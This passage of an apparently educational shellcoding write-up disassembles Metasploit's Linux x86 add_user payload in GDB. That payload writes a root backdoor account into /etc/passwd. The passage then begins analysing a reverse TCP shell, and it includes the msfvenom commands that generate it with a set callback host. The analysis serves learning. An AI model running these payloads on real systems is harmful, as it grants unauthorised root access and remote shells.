</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>00000004</span>  <span class=mi>6</span><span class=no>A46</span>              <span class=no>push</span> <span class=no>byte</span> <span class=err>+</span><span class=mi>0x46</span>
</span></span><span class=line><span class=cl><span class=err>00000006</span>  <span class=err>58</span>                <span class=nf>pop</span> <span class=no>eax</span>             <span class=c>; setgid() syscall
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>00000007</span>  <span class=no>CD80</span>              <span class=no>int</span> <span class=mi>0x80</span>            <span class=c>; execute syscall
</span></span></span></code></pre></td></tr></table></div></div><p>As we can see below, it&rsquo;s <code>setgid()</code>.</p><pre tabindex=0><code>#define __NR_prof 44
#define __NR_brk 45
#define __NR_setgid 46
#define __NR_getgid 47
#define __NR_signal 48
</code></pre><p>Running <code>man 2 setgid</code> tells us the syntax of the function and its description. The function only has one argument which is set to zero which we can see in the first two instructions.</p><pre tabindex=0><code>[...]
SYNOPSIS
       #include &lt;sys/types.h&gt;
       #include &lt;unistd.h&gt;

       int setgid(gid_t gid);

DESCRIPTION
       setgid() sets the effective group ID of the calling process.  If the caller is the superuser, the real GID and saved set-group-ID are also set.
[...]
</code></pre><p>The next section has a little more going on, we can see that there are twelve bytes being pushed onto the stack. Decoding <code>2f6574632f2f706173737764</code> reveals <code>/etc//passwd</code>. The first instruction also pushes <code>0x5</code> onto the stack, which is again immediately poped into <code>eax</code>. We know from the previous shellcode that this value corresponds to the syscall <code>open()</code>. Now it&rsquo;s clear that this section opens the file <code>/etc/passwd</code> and returns a file descriptor, as seen in the previous payload.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=err>00000009</span>  <span class=err>6</span><span class=nf>A05</span>              <span class=no>push</span> <span class=no>byte</span> <span class=err>+</span><span class=mi>0x5</span>
</span></span><span class=line><span class=cl><span class=err>0000000</span><span class=nf>B</span>  <span class=mi>58</span>                <span class=no>pop</span> <span class=no>eax</span>                 <span class=c>; open() syscall
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>0000000</span><span class=no>C</span>  <span class=mi>31</span><span class=no>C9</span>              <span class=no>xor</span> <span class=no>ecx</span><span class=p>,</span><span class=no>ecx</span>             <span class=c>; zero out ecx
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>0000000</span><span class=no>E</span>  <span class=mi>51</span>                <span class=no>push</span> <span class=no>ecx</span>                <span class=c>; null terminator
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>0000000</span><span class=no>F</span>  <span class=mi>6873737764</span>        <span class=no>push</span> <span class=no>dword</span> <span class=mi>0x64777373</span>
</span></span><span class=line><span class=cl><span class=err>00000014</span>  <span class=err>682</span><span class=nf>F2F7061</span>        <span class=no>push</span> <span class=no>dword</span> <span class=mi>0x61702f2f</span>
</span></span><span class=line><span class=cl><span class=err>00000019</span>  <span class=err>682</span><span class=nf>F657463</span>        <span class=no>push</span> <span class=no>dword</span> <span class=mi>0x6374652f</span>   <span class=c>; etc//passwd
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>0000001</span><span class=no>E</span>  <span class=mi>89</span><span class=no>E3</span>              <span class=no>mov</span> <span class=no>ebx</span><span class=p>,</span><span class=no>esp</span>             <span class=c>; ebx points to filepath
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>00000020</span>  <span class=mi>41</span>                <span class=no>inc</span> <span class=no>ecx</span>                 <span class=c>; increment ecx, is now 1
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>00000021</span>  <span class=no>B504</span>              <span class=no>mov</span> <span class=no>ch</span><span class=p>,</span><span class=mi>0x4</span>              <span class=c>; move 0x4 to ecx
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>00000023</span>  <span class=no>CD80</span>              <span class=no>int</span> <span class=mi>0x80</span>                <span class=c>; execute syscall
</span></span></span></code></pre></td></tr></table></div></div><p>Now comes the juicy part, modifying <code>/etc/passwd</code>. Everything after address <code>00000026</code> looks like gibberish, and the fact that there is a <code>call</code> instruction makes me believe that this is a call-pop technique that we have seen in the previous example. For this last part, I will use GDB to analyze how the program adds a new user to the system.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=err>00000025</span>  <span class=err>93</span>                <span class=nf>xchg</span> <span class=no>eax</span><span class=p>,</span><span class=no>ebx</span>        <span class=c>; change the value in eax to ebx and vice verca. ebx now contains the FD
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>00000026</span>  <span class=no>E828000000</span>        <span class=no>call</span> <span class=no>dword</span> <span class=mi>0x53</span>
</span></span><span class=line><span class=cl><span class=err>0000002</span><span class=nf>B</span>  <span class=mi>6</span><span class=no>D</span>                <span class=no>insd</span>
</span></span><span class=line><span class=cl><span class=err>0000002</span><span class=nf>C</span>  <span class=mi>657461</span>            <span class=no>gs</span> <span class=no>jz</span> <span class=mi>0x90</span>
</span></span><span class=line><span class=cl><span class=err>0000002</span><span class=nf>F</span>  <span class=mi>7370</span>              <span class=no>jnc</span> <span class=mi>0xa1</span>
</span></span><span class=line><span class=cl><span class=err>00000031</span>  <span class=err>6</span><span class=nf>C</span>                <span class=no>insb</span>
</span></span><span class=line><span class=cl><span class=err>00000032</span>  <span class=err>6</span><span class=nf>F</span>                <span class=no>outsd</span>
</span></span><span class=line><span class=cl><span class=err>00000033</span>  <span class=err>69743</span><span class=nf>A417A2F6449</span>  <span class=no>imul</span> <span class=no>esi</span><span class=p>,[</span><span class=no>edx</span><span class=err>+</span><span class=no>edi</span><span class=err>+</span><span class=mi>0x41</span><span class=p>],</span><span class=no>dword</span> <span class=mi>0x49642f7a</span>
</span></span><span class=line><span class=cl><span class=err>0000003</span><span class=nf>B</span>  <span class=mi>736</span><span class=no>A</span>              <span class=no>jnc</span> <span class=mi>0xa7</span>
</span></span><span class=line><span class=cl><span class=err>0000003</span><span class=nf>D</span>  <span class=mi>3470</span>              <span class=no>xor</span> <span class=no>al</span><span class=p>,</span><span class=mi>0x70</span>
</span></span><span class=line><span class=cl><span class=err>0000003</span><span class=nf>F</span>  <span class=mi>3449</span>              <span class=no>xor</span> <span class=no>al</span><span class=p>,</span><span class=mi>0x49</span>
</span></span><span class=line><span class=cl><span class=err>00000041</span>  <span class=err>52</span>                <span class=nf>push</span> <span class=no>edx</span>
</span></span><span class=line><span class=cl><span class=err>00000042</span>  <span class=err>633</span><span class=nf>A</span>              <span class=no>arpl</span> <span class=p>[</span><span class=no>edx</span><span class=p>],</span><span class=no>di</span>
</span></span><span class=line><span class=cl><span class=err>00000044</span>  <span class=err>303</span><span class=nf>A</span>              <span class=no>xor</span> <span class=p>[</span><span class=no>edx</span><span class=p>],</span><span class=no>bh</span>
</span></span><span class=line><span class=cl><span class=err>00000046</span>  <span class=err>303</span><span class=nf>A</span>              <span class=no>xor</span> <span class=p>[</span><span class=no>edx</span><span class=p>],</span><span class=no>bh</span>
</span></span><span class=line><span class=cl><span class=err>00000048</span>  <span class=err>3</span><span class=nf>A2F</span>              <span class=no>cmp</span> <span class=no>ch</span><span class=p>,[</span><span class=no>edi</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=err>0000004</span><span class=nf>A</span>  <span class=mi>3</span><span class=no>A2F</span>              <span class=no>cmp</span> <span class=no>ch</span><span class=p>,[</span><span class=no>edi</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=err>0000004</span><span class=nf>C</span>  <span class=mi>62696</span><span class=no>E</span>            <span class=no>bound</span> <span class=no>ebp</span><span class=p>,[</span><span class=no>ecx</span><span class=err>+</span><span class=mi>0x6e</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=err>0000004</span><span class=nf>F</span>  <span class=mi>2</span><span class=no>F</span>                <span class=no>das</span>
</span></span><span class=line><span class=cl><span class=err>00000050</span>  <span class=err>7368</span>              <span class=nf>jnc</span> <span class=mi>0xba</span>
</span></span><span class=line><span class=cl><span class=err>00000052</span>  <span class=err>0</span><span class=nf>A598B</span>            <span class=no>or</span> <span class=no>bl</span><span class=p>,[</span><span class=no>ecx-0x75</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=err>00000055</span>  <span class=err>51</span>                <span class=nf>push</span> <span class=no>ecx</span>
</span></span><span class=line><span class=cl><span class=err>00000056</span>  <span class=nf>FC</span>                <span class=no>cld</span>
</span></span><span class=line><span class=cl><span class=err>00000057</span>  <span class=err>6</span><span class=nf>A04</span>              <span class=no>push</span> <span class=no>byte</span> <span class=err>+</span><span class=mi>0x4</span>
</span></span><span class=line><span class=cl><span class=err>00000059</span>  <span class=err>58</span>                <span class=nf>pop</span> <span class=no>eax</span>
</span></span><span class=line><span class=cl><span class=err>0000005</span><span class=nf>A</span>  <span class=no>CD80</span>              <span class=no>int</span> <span class=mi>0x80</span>
</span></span></code></pre></td></tr></table></div></div><p>The binary is stripped from any debug symbols, but we can use <code>readelf</code> to get the entry point of the program. With this information we can debug the program.</p><pre tabindex=0><code>dubs3c@slae:~/SLAE/EXAM/github/assignment_5$ readelf -h add_user
ELF Header:
  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00
  Class:                             ELF32
  Data:                              2&#39;s complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              EXEC (Executable file)
  Machine:                           Intel 80386
  Version:                           0x1
  Entry point address:               0x8048054
  Start of program headers:          52 (bytes into file)
  Start of section headers:          0 (bytes into file)
  Flags:                             0x0
  Size of this header:               52 (bytes)
  Size of program headers:           32 (bytes)
  Number of program headers:         1
  Size of section headers:           0 (bytes)
  Number of section headers:         0
  Section header string table index: 0
</code></pre><p>Loading the binary with GDB and setting necessary breakpoints gives shows us the disassembled binary.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nl>dubs3c@slae:</span><span class=err>~/</span><span class=nf>SLAE</span><span class=err>/</span><span class=no>EXAM</span><span class=err>/</span><span class=no>github</span><span class=err>/</span><span class=no>assignment_5$</span> <span class=no>gdb</span> <span class=p>-</span><span class=no>q</span> <span class=no>add_user</span>
</span></span><span class=line><span class=cl><span class=nf>Reading</span> <span class=no>symbols</span> <span class=no>from</span> <span class=err>/</span><span class=no>home</span><span class=err>/</span><span class=no>dubs3c</span><span class=err>/</span><span class=no>SLAE</span><span class=err>/</span><span class=no>EXAM</span><span class=err>/</span><span class=no>github</span><span class=err>/</span><span class=no>assignment_5</span><span class=err>/</span><span class=no>add_user...</span><span class=p>(</span><span class=no>no</span> <span class=no>debugging</span> <span class=no>symbols</span> <span class=no>found</span><span class=p>)...</span><span class=no>done.</span>
</span></span><span class=line><span class=cl><span class=err>(</span><span class=nf>gdb</span><span class=p>)</span> <span class=no>b</span> <span class=p>*</span><span class=mi>0x8048054</span>
</span></span><span class=line><span class=cl><span class=nf>Breakpoint</span> <span class=mi>1</span> <span class=no>at</span> <span class=mi>0x8048054</span>
</span></span><span class=line><span class=cl><span class=err>(</span><span class=nf>gdb</span><span class=p>)</span> <span class=no>r</span>
</span></span><span class=line><span class=cl><span class=nf>Starting</span> <span class=no>program</span><span class=p>:</span> <span class=err>/</span><span class=no>home</span><span class=err>/</span><span class=no>dubs3c</span><span class=err>/</span><span class=no>SLAE</span><span class=err>/</span><span class=no>EXAM</span><span class=err>/</span><span class=no>github</span><span class=err>/</span><span class=no>assignment_5</span><span class=err>/</span><span class=no>add_user</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nf>Breakpoint</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>0x08048054</span> <span class=no>in</span> <span class=err>??</span> <span class=p>()</span>
</span></span><span class=line><span class=cl><span class=err>(</span><span class=nf>gdb</span><span class=p>)</span> <span class=no>disas</span> <span class=mi>0x8048054</span><span class=p>,</span> <span class=mi>0x8048054</span><span class=err>+</span><span class=mi>97</span>
</span></span><span class=line><span class=cl><span class=nf>Dump</span> <span class=no>of</span> <span class=no>assembler</span> <span class=no>code</span> <span class=no>from</span> <span class=mi>0x8048054</span> <span class=no>to</span> <span class=mi>0x80480b5</span><span class=p>:</span>
</span></span><span class=line><span class=cl><span class=err>=&gt;</span> <span class=err>0</span><span class=nl>x08048054:</span>  <span class=nf>xor</span>    <span class=no>ecx</span><span class=p>,</span><span class=no>ecx</span>
</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nl>x08048056:</span>  <span class=nf>mov</span>    <span class=no>ebx</span><span class=p>,</span><span class=no>ecx</span>
</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nl>x08048058:</span>  <span class=nf>push</span>   <span class=mi>0x46</span>
</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nl>x0804805a:</span>  <span class=nf>pop</span>    <span class=no>eax</span>
</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nl>x0804805b:</span>  <span class=nf>int</span>    <span class=mi>0x80</span>
</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nl>x0804805d:</span>  <span class=nf>push</span>   <span class=mi>0x5</span>
</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nl>x0804805f:</span>  <span class=nf>pop</span>    <span class=no>eax</span>
</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nl>x08048060:</span>  <span class=nf>xor</span>    <span class=no>ecx</span><span class=p>,</span><span class=no>ecx</span>
</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nl>x08048062:</span>  <span class=nf>push</span>   <span class=no>ecx</span>
</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nl>x08048063:</span>  <span class=nf>push</span>   <span class=mi>0x64777373</span>
</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nl>x08048068:</span>  <span class=nf>push</span>   <span class=mi>0x61702f2f</span>
</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nl>x0804806d:</span>  <span class=nf>push</span>   <span class=mi>0x6374652f</span>
</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nl>x08048072:</span>  <span class=nf>mov</span>    <span class=no>ebx</span><span class=p>,</span><span class=no>esp</span>
</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nl>x08048074:</span>  <span class=nf>inc</span>    <span class=no>ecx</span>
</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nl>x08048075:</span>  <span class=nf>mov</span>    <span class=no>ch</span><span class=p>,</span><span class=mi>0x4</span>
</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nl>x08048077:</span>  <span class=nf>int</span>    <span class=mi>0x80</span>
</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nl>x08048079:</span>  <span class=nf>xchg</span>   <span class=no>ebx</span><span class=p>,</span><span class=no>eax</span>
</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nl>x0804807a:</span>  <span class=nf>call</span>   <span class=mi>0x80480a7</span>
</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nl>x0804807f:</span>  <span class=nf>ins</span>    <span class=no>DWORD</span> <span class=no>PTR</span> <span class=no>es</span><span class=p>:[</span><span class=no>edi</span><span class=p>],</span><span class=no>dx</span>
</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nl>x08048080:</span>  <span class=nf>gs</span>
</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nl>x08048081:</span>  <span class=nf>je</span>     <span class=mi>0x80480e4</span>
</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nl>x08048083:</span>  <span class=nf>jae</span>    <span class=mi>0x80480f5</span>
</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nl>x08048085:</span>  <span class=nf>ins</span>    <span class=no>BYTE</span> <span class=no>PTR</span> <span class=no>es</span><span class=p>:[</span><span class=no>edi</span><span class=p>],</span><span class=no>dx</span>
</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nl>x08048086:</span>  <span class=nf>outs</span>   <span class=no>dx</span><span class=p>,</span><span class=no>DWORD</span> <span class=no>PTR</span> <span class=no>ds</span><span class=p>:[</span><span class=no>esi</span><span class=p>]</span>
</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nl>x08048087:</span>  <span class=nf>imul</span>   <span class=no>esi</span><span class=p>,</span><span class=no>DWORD</span> <span class=no>PTR</span> <span class=p>[</span><span class=no>edx</span><span class=err>+</span><span class=no>edi</span><span class=p>*</span><span class=mi>1</span><span class=err>+</span><span class=mi>0x41</span><span class=p>],</span><span class=mi>0x49642f7a</span>
</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nl>x0804808f:</span>  <span class=nf>jae</span>    <span class=mi>0x80480fb</span>
</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nl>x08048091:</span>  <span class=nf>xor</span>    <span class=no>al</span><span class=p>,</span><span class=mi>0x70</span>
</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nl>x08048093:</span>  <span class=nf>xor</span>    <span class=no>al</span><span class=p>,</span><span class=mi>0x49</span>
</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nl>x08048095:</span>  <span class=nf>push</span>   <span class=no>edx</span>
</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nl>x08048096:</span>  <span class=nf>arpl</span>   <span class=no>WORD</span> <span class=no>PTR</span> <span class=p>[</span><span class=no>edx</span><span class=p>],</span><span class=no>di</span>
</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nl>x08048098:</span>  <span class=nf>xor</span>    <span class=no>BYTE</span> <span class=no>PTR</span> <span class=p>[</span><span class=no>edx</span><span class=p>],</span><span class=no>bh</span>
</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nl>x0804809a:</span>  <span class=nf>xor</span>    <span class=no>BYTE</span> <span class=no>PTR</span> <span class=p>[</span><span class=no>edx</span><span class=p>],</span><span class=no>bh</span>
</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nl>x0804809c:</span>  <span class=nf>cmp</span>    <span class=no>ch</span><span class=p>,</span><span class=no>BYTE</span> <span class=no>PTR</span> <span class=p>[</span><span class=no>edi</span><span class=p>]</span>
</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nl>x0804809e:</span>  <span class=nf>cmp</span>    <span class=no>ch</span><span class=p>,</span><span class=no>BYTE</span> <span class=no>PTR</span> <span class=p>[</span><span class=no>edi</span><span class=p>]</span>
</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nl>x080480a0:</span>  <span class=nf>bound</span>  <span class=no>ebp</span><span class=p>,</span><span class=no>QWORD</span> <span class=no>PTR</span> <span class=p>[</span><span class=no>ecx</span><span class=err>+</span><span class=mi>0x6e</span><span class=p>]</span>
</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nl>x080480a3:</span>  <span class=nf>das</span>
</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nl>x080480a4:</span>  <span class=nf>jae</span>    <span class=mi>0x804810e</span>
</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nl>x080480a6:</span>  <span class=nf>or</span>     <span class=no>bl</span><span class=p>,</span><span class=no>BYTE</span> <span class=no>PTR</span> <span class=p>[</span><span class=no>ecx-0x75</span><span class=p>]</span>
</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nl>x080480a9:</span>  <span class=nf>push</span>   <span class=no>ecx</span>
</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nl>x080480aa:</span>  <span class=nf>cld</span>
</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nl>x080480ab:</span>  <span class=nf>push</span>   <span class=mi>0x4</span>
</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nl>x080480ad:</span>  <span class=nf>pop</span>    <span class=no>eax</span>
</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nl>x080480ae:</span>  <span class=nf>int</span>    <span class=mi>0x80</span>
</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nl>x080480b0:</span>  <span class=nf>push</span>   <span class=mi>0x1</span>
</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nl>x080480b2:</span>  <span class=nf>pop</span>    <span class=no>eax</span>
</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nl>x080480b3:</span>  <span class=nf>int</span>    <span class=mi>0x80</span>
</span></span><span class=line><span class=cl><span class=nf>End</span> <span class=no>of</span> <span class=no>assembler</span> <span class=no>dump.</span>
</span></span><span class=line><span class=cl><span class=err>(</span><span class=nf>gdb</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>We are interested in the following instruction <code>0x0804807a: call 0x80480a7</code>. Let&rsquo;s set a breakpoint and step to the next instruction to see where we land!</p><pre tabindex=0><code>(gdb) b *0x0804807a
Breakpoint 2 at 0x804807a
(gdb) c
Continuing.

Breakpoint 2, 0x0804807a in ?? ()
(gdb) ni
0x080480a7 in ?? ()
(gdb) x/8i $pc                                                                                                                        =&gt; 0x80480a7:   pop    ecx
   0x80480a8:   mov    edx,DWORD PTR [ecx-0x4]
   0x80480ab:   push   0x4
   0x80480ad:   pop    eax      ; write() syscall
   0x80480ae:   int    0x80     ; execute syscall
   0x80480b0:   push   0x1
   0x80480b2:   pop    eax      ; exit() syscall
   0x80480b3:   int    0x80     ; execute syscall, exit program
(gdb) ni
0x080480a8 in ?? ()
(gdb) x/s  $ecx
0x804807f:      &#34;metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh\nY\213Q\374j\004Xj\001X&#34;
(gdb) x/x $ecx-4
0x804807b:      0x28
(gdb)
</code></pre><p>As can be seen in the above GDB output, the gibberish data was actually a string containing the new username and password. This string will be written to <code>/etc/passwd</code>. The string was popped into <code>ecx</code> because of the call instruction that pushed the address of the following instruction onto the stack. <code>edx</code> contains the amount of bytes to write, the instruction that computes this is at address <code>0x80480a8</code>. Completing the program inserts a new user called metasploit (password is metasploit) to the system:</p><pre tabindex=0><code>dubs3c@slae:~/SLAE/EXAM/github/assignment_5$ grep metasploit /etc/passwd
metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh
</code></pre><p>Should be noted that the binary needs to be run as root, since it&rsquo;s adding a root user.</p><h2 id=linuxx86shellreverse_tcp>linux/x86/shell/reverse_tcp</h2><p>For the final paylaod, we&rsquo;ll analyze <code>linux/x86/shell/reverse_tcp</code> which can be generated with:</p><pre tabindex=0><code>$ msfvenom -p linux/x86/shell/reverse_tcp -a x86 --platform linux lhost=192.168.1.20 lport=1337 -f elf -o build/reverse_tcp
</code></pre><p>A reverse shell will send a local shell to a remote server, often controlled by an attacker. Let&rsquo;s begin analyzing with <code>ndisasm</code> again.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nl>dubs3c@slae:</span><span class=err>~/</span><span class=nf>SLAE</span><span class=err>/</span><span class=no>EXAM</span><span class=err>/</span><span class=no>github</span><span class=err>/</span><span class=no>assignment_5$</span> <span class=no>msfvenom</span> <span class=p>-</span><span class=no>p</span> <span class=no>linux</span><span class=err>/</span><span class=no>x86</span><span class=err>/</span><span class=no>shell</span><span class=err>/</span><span class=no>reverse_tcp</span> <span class=p>-</span><span class=no>a</span> <span class=no>x86</span> <span class=p>--</span><span class=no>platform</span> <span class=no>linux</span> <span class=no>lhost</span><span class=err>=</span><span class=mi>192</span><span class=no>.168.1.20</span> <span class=no>lport</span><span class=err>=</span><span class=mi>1337</span> <span class=p>-</span><span class=no>f</span> <span class=no>raw</span> <span class=err>|</span> <span class=no>ndisasm</span> <span class=p>-</span><span class=no>u</span> <span class=p>-</span>
</span></span><span class=line><span class=cl><span class=nf>No</span> <span class=no>encoder</span> <span class=no>specified</span><span class=p>,</span> <span class=no>outputting</span> <span class=no>raw</span> <span class=no>payload</span>
</span></span><span class=line><span class=cl><span class=nf>Payload</span> <span class=no>size</span><span class=p>:</span> <span class=mi>123</span> <span class=no>bytes</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=err>00000000</span>  <span class=err>6</span><span class=nf>A0A</span>              <span class=no>push</span> <span class=no>byte</span> <span class=err>+</span><span class=mi>0xa</span>
</span></span><span class=line><span class=cl><span class=err>00000002</span>  <span class=err>5</span><span class=nf>E</span>                <span class=no>pop</span> <span class=no>esi</span>                 <span class=c>; 10 connection attempts
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>00000003</span>  <span class=mi>31</span><span class=no>DB</span>              <span class=no>xor</span> <span class=no>ebx</span><span class=p>,</span><span class=no>ebx</span>
</span></span><span class=line><span class=cl><span class=err>00000005</span>  <span class=nf>F7E3</span>              <span class=no>mul</span> <span class=no>ebx</span>
</span></span><span class=line><span class=cl><span class=err>00000007</span>  <span class=err>53</span>                <span class=nf>push</span> <span class=no>ebx</span>                <span class=c>; socket protocol: 0
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>00000008</span>  <span class=mi>43</span>                <span class=no>inc</span> <span class=no>ebx</span>                 <span class=c>; SYS_SOCKET
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>00000009</span>  <span class=mi>53</span>                <span class=no>push</span> <span class=no>ebx</span>                <span class=c>; socket type: SOCK_STREAM = 1
</span></span></span><span class=line><span class=cl><span class=c></span><span class=mi>0000000</span><span class=no>A</span>  <span class=mi>6</span><span class=no>A02</span>              <span class=no>push</span> <span class=no>byte</span> <span class=err>+</span><span class=mi>0x2</span>          <span class=c>; socket domain: PF_INET = 2
